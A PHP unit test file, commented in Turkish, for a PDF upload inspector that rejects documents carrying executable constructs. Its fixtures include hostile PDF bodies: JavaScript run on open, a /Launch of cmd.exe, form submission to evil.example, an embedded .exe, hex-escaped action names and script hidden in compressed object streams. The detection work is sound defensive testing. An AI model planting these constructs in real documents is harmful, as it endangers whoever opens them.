<?php

declare(strict_types=1);

namespace Tests\Unit\Media;

use App\Domain\Media\PdfInspector;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

/**
 * PDF DENETÇİSİ — sahibin 2026-09-05 kararının güvenlik yarısı.
 *
 * MÜŞTERİ SORUNU. Restoran sahibinin alerjen tablosu, tedarikçi sözleşmesi
 * ve iç eğitim notu PDF olarak geliyor. Depoda PDF OKUYUCU zaten yazılıydı
 * (`MediaViewerRegion`, `ShowMediaViewerController`) ama alım kapısı PDF'i
 * hiç kabul etmediği için o okuyucu ölü koddu: sahip dosyayı panele
 * koyamıyordu.
 *
 * Kararın diğer yarısı burada: **PDF bir görsel değil, çalıştırılabilir bir
 * belge biçimidir.** İçine açılışta çalışan JavaScript (`/OpenAction` →
 * `/JS`), dış program çağıran bağlantı (`/Launch`), sunucuya veri gönderen
 * form (`/SubmitForm`), başka bir dosyaya atlayan eylem (`/GoToR`) ve
 * gövdesinde taşınan ikinci bir dosya (`/EmbeddedFile`) gömülebilir. Bunlar
 * bizim sunucumuzda değil, dosyayı AÇAN kişinin makinesinde çalışır —
 * restoran sahibinin kendi bilgisayarında.
 *
 * NEDEN "DENETÇİ", "TEMİZLEYİCİ" DEĞİL: bkz. `App\Domain\Media\PdfInspector`
 * sınıf açıklaması. Bu sınıf hiçbir baytı değiştirmez; yalnız karar verir.
 *
 * Requirement IDs: MEDIA-PDF-INSPECT-01, MEDIA-PDF-FAIL-CLOSED-01,
 * MEDIA-PDF-OBJSTM-HONEST-01.
 */
final class PdfInspectorTest extends TestCase
{
    private function inspector(): PdfInspector
    {
        return new PdfInspector;
    }

    /** Zararsız, elle yazılmış, sıkıştırılmamış iki sayfalık bir belge. */
    private function cleanPdf(): string
    {
        return "%PDF-1.4\n"
            ."1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n"
            ."2 0 obj << /Type /Pages /Kids [3 0 R 4 0 R] /Count 2 >> endobj\n"
            ."3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 5 0 R >> endobj\n"
            ."4 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] >> endobj\n"
            ."5 0 obj << /Length 44 >> stream\nBT /F1 12 Tf 40 800 Td (Alerjen tablosu) Tj ET\nendstream endobj\n"
            ."trailer << /Root 1 0 R >>\n%%EOF\n";
    }

    // --- MEDIA-PDF-INSPECT-01 ----------------------------------------------

    public function test_a_plain_document_is_accepted(): void
    {
        $result = $this->inspector()->inspect($this->cleanPdf());

        self::assertTrue($result->isSafe(), 'Zararsız bir PDF reddedildi; sahip alerjen tablosunu panele hiç koyamaz.');
        self::assertSame([], $result->threats);
        self::assertNull($result->failureReason);
    }

    /**
     * YANLIŞ POZİTİF, ÜRÜNÜ ÖLDÜREN HATADIR.
     *
     * Word ve LaTeX çıktılarının çoğu "açılınca şu sayfada, şu yakınlıkta
     * dur" diyen bir `/OpenAction` taşır. O bir EYLEM değil bir HEDEFTİR:
     * belgenin dışına çıkamaz, hiçbir şey çalıştırmaz. Onu reddetmek,
     * dünyadaki PDF'lerin büyük kısmını reddetmek olurdu.
     */
    public function test_an_open_action_that_only_jumps_inside_the_document_is_not_a_threat(): void
    {
        $destination = "%PDF-1.5\n"
            ."1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction [3 0 R /XYZ null null null] >> endobj\n"
            ."2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n"
            ."3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] >> endobj\n"
            ."trailer << /Root 1 0 R >>\n%%EOF\n";

        self::assertTrue($this->inspector()->inspect($destination)->isSafe());

        $goTo = str_replace(
            '/OpenAction [3 0 R /XYZ null null null]',
            '/OpenAction << /S /GoTo /D [3 0 R /Fit] >>',
            $destination,
        );

        self::assertTrue($this->inspector()->inspect($goTo)->isSafe(), 'Belge içi sıçrama bir saldırı değildir.');
    }

    // --- MEDIA-PDF-FAIL-CLOSED-01 ------------------------------------------

    /**
     * @return array<string, array{0:string, 1:string}>
     */
    public static function hostileBodies(): array
    {
        $head = "%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 2 0 R ";
        $tail = ">> endobj\n2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n"
            ."3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] >> endobj\n"
            ."trailer << /Root 1 0 R >>\n%%EOF\n";

        return [
            'açılışta çalışan JavaScript' => [
                $head.'/OpenAction << /S /JavaScript /JS (app.alert\(1\);) >> '.$tail,
                'javascript',
            ],
            'kısa adıyla JS' => [
                $head.'/OpenAction << /S /JavaScript /JS 9 0 R >> '.$tail,
                'javascript',
            ],
            'sayfa ek eylemi' => [
                $head.'/AA << /O 9 0 R >> '.$tail,
                'auto-action',
            ],
            'dış program çalıştırma' => [
                $head.'/OpenAction << /S /Launch /F (cmd.exe) >> '.$tail,
                'launch',
            ],
            'form verisini dışarı gönderme' => [
                $head.'/AcroForm << /Fields [] >> /OpenAction << /S /SubmitForm /F (https://evil.example/collect) >> '.$tail,
                'network-action',
            ],
            'dışarıdan veri çekme' => [
                $head.'/OpenAction << /S /ImportData /F (https://evil.example/x.fdf) >> '.$tail,
                'network-action',
            ],
            'başka dosyaya atlama' => [
                $head.'/OpenAction << /S /GoToR /F (\\\\\\\\evil.example\\\\x.pdf) >> '.$tail,
                'network-action',
            ],
            'gömülü dosya' => [
                $head.'/Names << /EmbeddedFiles << /Names [(x.exe) 9 0 R] >> >> '.$tail,
                'embedded-file',
            ],
            'dosya belirteci' => [
                $head.'/X 9 0 R >> endobj\n9 0 obj << /Type /Filespec /F (x.exe) '.$tail,
                'embedded-file',
            ],
            'gömülü medya' => [
                $head.'/X << /Subtype /RichMedia >> '.$tail,
                'embedded-media',
            ],
            'film' => [
                $head.'/X << /Subtype /Movie /Movie << /F (x.avi) >> >> '.$tail,
                'embedded-media',
            ],
            'ses' => [
                $head.'/X << /Subtype /Sound /Sound 9 0 R >> '.$tail,
                'embedded-media',
            ],
            /*
                AD KAÇIRMA. PDF'te `/J#61vaScript` ile `/JavaScript` AYNI
                addır; okuyucu ikisini de çalıştırır. Kaçırılmış adı
                çözmeden aramak, kapıyı açık bırakıp kilitli sanmaktır.
            */
            'onaltılık kaçışla gizlenmiş ad' => [
                $head.'/OpenAction << /S /J#61vaScript /J#53 (app.alert\(1\);) >> '.$tail,
                'javascript',
            ],
        ];
    }

    #[DataProvider('hostileBodies')]
    public function test_a_body_carrying_an_executable_construct_is_rejected(string $body, string $threat): void
    {
        $result = $this->inspector()->inspect($body);

        self::assertFalse($result->isSafe(), 'Saldırı taşıyan gövde kabul edildi.');
        self::assertContains($threat, $result->threats);
        self::assertNotNull($result->failureReason);
        // Sebep SAHİBİN cümlesidir: "geçersiz dosya" ona ne olduğunu da ne
        // yapacağını da söylemez (`docs/76`).
        self::assertStringContainsString('PDF', (string) $result->failureReason);
    }

    /**
     * @return array<string, array{0:string}>
     */
    public static function unreadableBodies(): array
    {
        return [
            'boş' => [''],
            'PDF değil' => ["%!PS-Adobe-3.0\n/Helvetica findfont\n"],
            'başlıksız' => [str_repeat('A', 2048)."%PDF-1.4\ntrailer << >>\n%%EOF\n"],
            'yarım inen dosya' => ["%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj\n"],
            'şifreli' => [
                "%PDF-1.4\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n"
                ."trailer << /Root 1 0 R /Encrypt 9 0 R >>\n%%EOF\n",
            ],
        ];
    }

    #[DataProvider('unreadableBodies')]
    public function test_a_body_we_cannot_read_is_refused_instead_of_being_trusted(string $body): void
    {
        $result = $this->inspector()->inspect($body);

        self::assertFalse($result->isSafe(), 'Okunamayan gövde "temiz" sayıldı.');
        self::assertNotNull($result->failureReason);
    }

    // --- MEDIA-PDF-OBJSTM-HONEST-01 ----------------------------------------

    /**
     * SIKIŞTIRILMIŞ NESNE AKIŞI (`/ObjStm`, PDF 1.5+).
     *
     * PDF 1.5'ten beri nesne SÖZLÜKLERİ — yani eylemlerin yaşadığı yer —
     * sıkıştırılmış bir akışın içine konabilir. Ham baytlarda `/JavaScript`
     * aramak orada HİÇBİR ŞEY bulmaz.
     *
     * Bu testin koruduğu söz: göremediğimiz bir şeyi "temiz" diye
     * geçirmeyiz. Akışı çözebiliyorsak İÇİNE bakarız; çözemiyorsak dosyayı
     * reddederiz.
     */
    public function test_javascript_hidden_inside_a_compressed_object_stream_is_found(): void
    {
        $hidden = (string) gzcompress('5 0 << /Type /Action /S /JavaScript /JS (app.alert(1);) >>', 9);

        $body = "%PDF-1.5\n"
            ."1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >> endobj\n"
            ."2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n"
            ."3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] >> endobj\n"
            .'4 0 obj << /Type /ObjStm /N 1 /First 6 /Filter /FlateDecode /Length '.strlen($hidden)." >> stream\n"
            .$hidden."\nendstream endobj\n"
            ."trailer << /Root 1 0 R >>\n%%EOF\n";

        self::assertStringNotContainsString('/JavaScript', $body, 'Fixture kendi kendini ele veriyor; sınav değersiz.');

        $result = $this->inspector()->inspect($body);

        self::assertFalse($result->isSafe(), 'Sıkıştırılmış akışın içindeki betik görülmedi.');
        self::assertContains('javascript', $result->threats);
    }

    public function test_an_object_stream_we_cannot_decompress_is_refused_rather_than_assumed_clean(): void
    {
        $body = "%PDF-1.5\n"
            ."1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n"
            ."2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n"
            ."3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] >> endobj\n"
            ."4 0 obj << /Type /ObjStm /N 3 /First 9 /Filter /LZWDecode /Length 16 >> stream\n"
            ."\x80\x0b\x60\x50\x22\x0c\x0c\x85\x01\x00\x02\x03\x04\x05\x06\x07\nendstream endobj\n"
            ."trailer << /Root 1 0 R >>\n%%EOF\n";

        $result = $this->inspector()->inspect($body);

        self::assertFalse($result->isSafe(), 'İçini göremediğimiz akış "temiz" sayıldı.');
        self::assertContains('opaque-object-stream', $result->threats);
    }

    /**
     * SIKIŞTIRILMIŞ ama ZARARSIZ bir belge kabul edilir.
     *
     * Aksi hâlde "PDF açıldı" demek bir yalan olurdu: bugün üretilen
     * PDF'lerin neredeyse tamamı sıkıştırılmıştır.
     */
    public function test_a_compressed_but_harmless_document_is_still_accepted(): void
    {
        $objects = (string) gzcompress('5 0 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>', 9);
        $content = (string) gzcompress('BT /F1 12 Tf 40 800 Td (Alerjen tablosu) Tj ET', 9);

        $body = "%PDF-1.5\n"
            ."1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n"
            ."2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n"
            ."3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 6 0 R >> endobj\n"
            .'4 0 obj << /Type /ObjStm /N 1 /First 6 /Filter /FlateDecode /Length '.strlen($objects)." >> stream\n"
            .$objects."\nendstream endobj\n"
            .'6 0 obj << /Filter /FlateDecode /Length '.strlen($content)." >> stream\n"
            .$content."\nendstream endobj\n"
            ."trailer << /Root 1 0 R >>\n%%EOF\n";

        self::assertTrue($this->inspector()->inspect($body)->isSafe());
    }

    /**
     * İÇERİK AKIŞI TARANMAZ ve bu bilinçlidir.
     *
     * Bir sayfanın çizim akışı metin ÇİZER, eylem TAŞIMAZ. İçinde
     * "/Launch" yazan bir cümle geçen güvenlik el kitabını reddetmek,
     * saldırı değil yanlış pozitif üretirdi.
     */
    public function test_a_page_that_merely_draws_the_word_launch_is_not_a_threat(): void
    {
        $drawn = 'BT /F1 12 Tf 40 800 Td (PDF /Launch eylemi nedir?) Tj ET';

        $body = "%PDF-1.4\n"
            ."1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n"
            ."2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n"
            ."3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 5 0 R >> endobj\n"
            .'5 0 obj << /Length '.strlen($drawn)." >> stream\n".$drawn."\nendstream endobj\n"
            ."trailer << /Root 1 0 R >>\n%%EOF\n";

        self::assertTrue($this->inspector()->inspect($body)->isSafe());
    }

    // --- Fixture kapısı -----------------------------------------------------

    public function test_every_malicious_pdf_fixture_is_recognised(): void
    {
        $fixtures = glob(dirname(__DIR__, 2).'/fixtures/malicious/*.pdf') ?: [];

        self::assertGreaterThanOrEqual(5, count($fixtures), 'Kapının koruyacağı PDF fixture\'ı yok.');

        foreach ($fixtures as $path) {
            $result = $this->inspector()->inspect((string) file_get_contents($path));

            self::assertFalse($result->isSafe(), 'MALICIOUS-PDF: `'.basename($path).'` temiz sayıldı.');
        }
    }
}
